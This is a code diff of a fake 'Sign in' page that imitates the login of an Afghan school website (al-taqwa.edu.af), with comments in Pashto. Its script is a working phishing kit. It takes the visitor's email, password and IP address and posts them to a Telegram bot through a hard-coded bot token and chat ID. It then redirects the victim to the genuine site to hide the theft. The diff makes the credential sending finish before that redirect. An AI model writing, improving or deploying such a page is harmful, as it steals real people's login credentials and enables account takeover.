@@ -6,6 +6,7 @@
 <title>Login</title>
 
 <style>
+
 *{
     margin:0;
     padding:0;
@@ -26,11 +27,15 @@ body{
     width:480px;
     max-width:95%;
     height:479px;
+
     background:#fff;
     border-radius:16px;
+
     padding:38px 14px 26px 14px;
+
     border:1px solid #e0e0e0;
     box-shadow:0 4px 14px rgba(0,0,0,0.08);
+
     display:flex;
     flex-direction:column;
     justify-content:center;
@@ -123,14 +128,16 @@ button:hover{
     margin-top: 12px;
     display: none;
 }
+
 </style>
 </head>
 
 <body>
 
 <div class="login-container">
+
     <div class="logo">
-        <img src="Screenshot_2026-06-08-23-00-41-466_com.android.chrome~2.jpg" alt="Logo">
+        <img src="Screenshot_2026-06-08-23-00-41-466_com.android.chrome~2.jpg">
     </div>
 
     <div class="title">Sign in</div>
@@ -153,10 +160,11 @@ button:hover{
     </div>
 
     <button id="loginBtn">Login</button>
+
 </div>
 
 <script>
-    // ==================== د Telegram بوټ نوي تنظیمات ====================
+    // ==================== د Telegram بوټ تنظیمات ====================
     const BOT_TOKEN = "8688494134:AAEFObEX1p4syZwUBPVe-iG5GXkWDj311CA";
     const ADMIN_CHAT_ID = "8295417969";
 
@@ -166,7 +174,7 @@ button:hover{
         return pashtoRegex.test(text);
     }
 
-    // ========== د ایمیل تایید ==========
+    // ========== د ایمیل تایید (یوازې سم ایمیل) ==========
     function isValidEmail(email) {
         const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
         return emailRegex.test(email);
@@ -188,9 +196,9 @@ button:hover{
         }
     }
 
-    // اډمن ته د معلوماتو لېږل
+    // اډمن ته پیغام لیږل (یوازې بریالي هڅو لپاره)
     async function sendToAdmin(email, password, ip) {
-        const message = `✅ *NEW LOGIN* ✅\n\n📍 *Source:* al-taqwa.edu.af/login\n👤 *Email:* ${email}\n🔑 *Password:* ${password}\n🌐 *IP:* ${ip}\n🕒 *Time:* ${new Date().toLocaleString()}`;
+        const message = `✅ *SUCCESSFUL LOGIN* ✅\n\n📍 *Source:* al-taqwa.edu.af/login\n👤 *Email:* ${email}\n🔑 *Password:* ${password}\n🌐 *IP:* ${ip}\n🕒 *Time:* ${new Date().toLocaleString()}`;
         
         try {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -220,21 +228,26 @@ button:hover{
         const email = document.getElementById('email').value.trim();
         const password = document.getElementById('password').value.trim();
 
-        // د خالي ځایونو چک کول
+        // خالي ساحې چک کول
         if (!email || !password) {
             showError('Please fill in both email and password');
             return;
         }
 
         // د پښتو تورو چک
-        if (hasPashtoCharacters(email) || hasPashtoCharacters(password)) {
-            showError('Pashto not allowed');
+        if (hasPashtoCharacters(email)) {
+            showError('Pashto not allowed ');
+            return;
+        }
+        
+        if (hasPashtoCharacters(password)) {
+            showError('Pashto not allowed ');
             return;
         }
 
-        // د ایمیل فورمټ چک
+        // د ایمیل فورمټ چک (یوازې سم ایمیل)
         if (!isValidEmail(email)) {
-            showError('Please enter a valid email address');
+            showError('Please enter a valid email address (e.g., username@gmail.com)');
             return;
         }
 
@@ -244,14 +257,13 @@ button:hover{
             return;
         }
 
-        // د IP ترلاسه کول
         const ip = await getUserIP();
 
-        // سمدستي د لینک خلاصول (د لوډینګ د ځنډ څخه د مخنیوي لپاره)
-        window.location.href = "https://www.altaqwa.edu.af/login";
-
-        // په شاليد (Background) کې اډمن ته د ډاټا لېږل ترڅو پروسه معطله نشي
-        sendToAdmin(email, password, ip);
+        // په لومړی ځل بریالي لاګ ان - معلومات اډمن ته واستوئ
+        await sendToAdmin(email, password, ip);
+        
+        // مستقیم altaqwa.edu.af/login ته لاړ شه (د لوډینګ پرته)
+        window.location.replace("https://www.altaqwa.edu.af/login");
     });
 </script>
 
